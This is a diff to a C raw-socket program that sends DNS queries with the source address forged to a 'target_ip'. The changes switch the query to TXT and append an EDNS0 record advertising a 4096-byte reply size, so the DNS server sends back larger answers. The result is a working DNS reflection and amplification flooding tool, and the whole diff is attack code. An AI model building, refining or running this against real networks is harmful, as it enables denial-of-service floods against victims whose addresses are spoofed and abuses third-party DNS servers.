@@ -49,6 +49,9 @@ typedef struct
 	unsigned short qclass;
 }query;
 
+// extended dns
+unsigned char EXT[] = {0x00, 0x00, 0x29, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x0a, 0x00, 0x08, 0x74, 0xbf, 0x3e, 0x69, 0xd1, 0x29, 0x23, 0xc6};
+
 int main(int argc, char **argv){
     /* check all setting are done */
 	if(getuid()!=0 || argc < 4){
@@ -76,7 +79,7 @@ void dns_send(char *target_ip, int target_port, char *dns_ip, int dns_port){
     memset(packet, 0, 4096);
     iphdr *ip = (iphdr *)packet; // ip header struct
     udphdr *udp = (udphdr *)(packet + sizeof(iphdr)); // udp header struct
-    unsigned char dns_data[128]; // dns data(header + content)
+    unsigned char dns_data[256]; // dns data(header + content)
     // dns
     dnshdr *dns = (dnshdr *)&dns_data;
     dns->id = (unsigned short) htons(0x6652);
@@ -101,11 +104,14 @@ void dns_send(char *target_ip, int target_port, char *dns_ip, int dns_port){
     dns_format(dns_name, url);
 
     query *q = (query *)&dns_data[sizeof(dnshdr) + strlen(dns_name) + 1];
-    q->qtype = htons(1); //28: AAAA
+    q->qtype = htons(16); //28: AAAA
     q->qclass = htons(1);
 
+    unsigned char *ext = dns_data + sizeof(dnshdr) + strlen(dns_name) + 1 + sizeof(query);
+    memcpy(dns_data + sizeof(dnshdr) + strlen(dns_name) + 1 + sizeof(query) , EXT, sizeof(EXT));
+
     char *data = packet + sizeof(iphdr) + sizeof(udphdr);
-    memcpy(data, &dns_data, sizeof(dnshdr) + strlen(dns_name) + sizeof(query) + 1);
+    memcpy(data, &dns_data, sizeof(dnshdr) + strlen(dns_name) + sizeof(query) + 1 + sizeof(EXT));
     // ip header
     ip->ihl = 5;
     ip->version = 4;
@@ -116,7 +122,7 @@ void dns_send(char *target_ip, int target_port, char *dns_ip, int dns_port){
     ip->ttl = 128;
     ip->saddr = inet_addr(target_ip);
     ip->daddr = sin.sin_addr.s_addr;
-    ip->tot_len = sizeof(iphdr) + sizeof(udphdr) + sizeof(dnshdr) + (strlen(dns_name) + 1) + sizeof(query);
+    ip->tot_len = sizeof(iphdr) + sizeof(udphdr) + sizeof(dnshdr) + (strlen(dns_name) + 1) + sizeof(query) + sizeof(EXT);
     ip->check = csum((unsigned short *)packet, ip->tot_len);
     // udp header
     udp->source = htons(target_port);
